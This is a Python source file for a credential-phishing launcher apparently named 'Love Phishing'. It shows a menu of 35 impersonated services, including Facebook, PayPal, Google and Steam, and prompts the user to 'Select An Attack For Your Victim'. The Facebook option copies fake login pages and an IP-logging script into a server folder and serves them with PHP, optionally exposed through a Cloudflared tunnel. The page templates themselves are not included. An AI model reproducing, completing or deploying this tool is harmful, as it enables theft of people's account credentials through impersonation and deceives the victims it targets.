import colorama
import sys
import os
import shutil
import subprocess
import socket

#Global Variables
CS_PORT =  8000
CLOUDFLARED = False

def printWelcome():
    print(colorama.Fore.BLUE+"\t        Welcome To")
    print(colorama.Fore.LIGHTRED_EX+"""
             _    _____   _____          
            | |  / _ \ \ / / __|         
            | |_| (_) \ V /| _|          
    ___ _  |____\___/_\_/ |___|  _  ___ 
    | _ \ |_ |_ _/ __| || |_ _| \| |/ __|
    |  _/ ' \ | |\__ \ __ || || .` | (_ |
    |_| |_||_|___|___/_||_|___|_|\_|\___|
                                                                        
    """)
    print(colorama.Fore.YELLOW+"\t\tVERSION : 1.0.0\n")
    print(colorama.Fore.LIGHTBLUE_EX+"[-] Created By Prem Shelby\n")
    print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}] Select An Attack For Your Victim [{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}]\n\n")

def printAttacks():
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Facebook",end="\t")
    print(f"[{colorama.Fore.WHITE}11{colorama.Fore.CYAN}] Twitch",end="\t")
    print(f"[{colorama.Fore.WHITE}21{colorama.Fore.CYAN}] DevianArt")

    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Instagram",end="\t")
    print(f"[{colorama.Fore.WHITE}12{colorama.Fore.CYAN}] Pinterest",end="\t")
    print(f"[{colorama.Fore.WHITE}22{colorama.Fore.CYAN}] Badoo")

    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] Google",end="\t")
    print(f"[{colorama.Fore.WHITE}13{colorama.Fore.CYAN}] Snapchat",end="\t")
    print(f"[{colorama.Fore.WHITE}23{colorama.Fore.CYAN}] Origin")

    print(f"[{colorama.Fore.WHITE}04{colorama.Fore.CYAN}] Microsoft",end="\t")
    print(f"[{colorama.Fore.WHITE}14{colorama.Fore.CYAN}] Linkedin",end="\t")
    print(f"[{colorama.Fore.WHITE}24{colorama.Fore.CYAN}] DropBox")

    print(f"[{colorama.Fore.WHITE}05{colorama.Fore.CYAN}] Netflix",end="\t")
    print(f"[{colorama.Fore.WHITE}15{colorama.Fore.CYAN}] Ebay",end="\t")
    print(f"[{colorama.Fore.WHITE}25{colorama.Fore.CYAN}] Yahoo")

    print(f"[{colorama.Fore.WHITE}06{colorama.Fore.CYAN}] Paypal",end="\t")
    print(f"[{colorama.Fore.WHITE}16{colorama.Fore.CYAN}] Quora",end="\t")
    print(f"[{colorama.Fore.WHITE}26{colorama.Fore.CYAN}] Wordpress")

    print(f"[{colorama.Fore.WHITE}07{colorama.Fore.CYAN}] Steam",end="\t")
    print(f"[{colorama.Fore.WHITE}17{colorama.Fore.CYAN}] Protonmail",end="\t")
    print(f"[{colorama.Fore.WHITE}27{colorama.Fore.CYAN}] Yandex")

    print(f"[{colorama.Fore.WHITE}08{colorama.Fore.CYAN}] Twitter",end="\t")
    print(f"[{colorama.Fore.WHITE}18{colorama.Fore.CYAN}] Spotify",end="\t")
    print(f"[{colorama.Fore.WHITE}28{colorama.Fore.CYAN}] StackoverFlow")

    print(f"[{colorama.Fore.WHITE}09{colorama.Fore.CYAN}] PlayStation",end="")
    print(f"[{colorama.Fore.WHITE}19{colorama.Fore.CYAN}] Reddit",end="\t")
    print(f"[{colorama.Fore.WHITE}29{colorama.Fore.CYAN}] Vk")

    print(f"[{colorama.Fore.WHITE}10{colorama.Fore.CYAN}] Tiktok",end="\t")
    print(f"[{colorama.Fore.WHITE}20{colorama.Fore.CYAN}] Adobe",end="\t")
    print(f"[{colorama.Fore.WHITE}30{colorama.Fore.CYAN}] XBOX")

    print(f"[{colorama.Fore.WHITE}31{colorama.Fore.CYAN}] Mediafire",end="\t")
    print(f"[{colorama.Fore.WHITE}32{colorama.Fore.CYAN}] Gitlab",end="\t")
    print(f"[{colorama.Fore.WHITE}33{colorama.Fore.CYAN}] Github")

    print(f"[{colorama.Fore.WHITE}34{colorama.Fore.CYAN}] Discord",end="\t")
    print(f"[{colorama.Fore.WHITE}35{colorama.Fore.CYAN}] Roblox\n\n")

def printExitAbout():
    print(f"[{colorama.Fore.WHITE}99{colorama.Fore.CYAN}] About",end="\t")
    print(f"[{colorama.Fore.WHITE}00{colorama.Fore.CYAN}] Exit\n\n")

def takeInput():
    choice = input(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}]{colorama.Fore.GREEN} Select an option : {colorama.Fore.RESET}")
    print("\n")
    try:
        choice = int(choice)
    except ValueError:
        sys.exit()
    return choice

def printInvalidChoice():
    print(f"{colorama.Fore.RED}[{colorama.Fore.WHITE}-{colorama.Fore.RED}] invalid choice")
    sys.exit()

def inputCustomPort():
    global CS_PORT
    print(colorama.Fore.YELLOW)
    choice = input(f"[{colorama.Fore.WHITE}?{colorama.Fore.YELLOW}] Do you want to use custom port ? (y/n) : {colorama.Fore.RESET}")    
    match choice:
        case 'y':
            print(colorama.Fore.CYAN)
            choice = input(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}] Enter Your Custom Port (1000-9999) : {colorama.Fore.RESET}")
            try:
                CS_PORT = int(choice)
            except ValueError:
                sys.exit()
        case 'n':
            CS_PORT = 8000
        case _:
            printInvalidChoice()

def printModesOfHosting():
    global CLOUDFLARED
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Localhost")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Cloudflared")

    choice = takeInput()
    match choice:
        case 1:
            inputCustomPort()
            CLOUDFLARED = False
        case 2:
            CLOUDFLARED = True
        case _:
            printInvalidChoice()

def inputFacebookAttack():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Traditional Login Page")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Advanced Voting Poll Login Page")
    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] Fake Security Login Page")
    print(f"[{colorama.Fore.WHITE}04{colorama.Fore.CYAN}] Facebook Messenger Login Page\n\n")

    choice = takeInput()
    match choice:
        case 1:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/facebook",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case _:
            printInvalidChoice()
    
    print(colorama.Fore.CYAN)
    choice = print(f"[{colorama.Fore.WHITE}-{colorama.Fore.CYAN}] Starting php server on ('{socket.gethostbyname_ex(socket.gethostname())[-1][-1]}',{CS_PORT}){colorama.Fore.RESET}")
    handle = subprocess.call(f".tools/php/php.exe -S {socket.gethostbyname_ex(socket.gethostname())[-1][-1]}:{CS_PORT}",cwd=os.path.abspath(".server"),stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

def inputAttackMethod():
    choice = takeInput()

    match choice:
        case 0:
            sys.exit()
        case 1:
            inputFacebookAttack()
        case _:
            printInvalidChoice()

if __name__ == "__main__":
    colorama.init()
    printWelcome()
    printAttacks()
    printExitAbout()
    inputAttackMethod()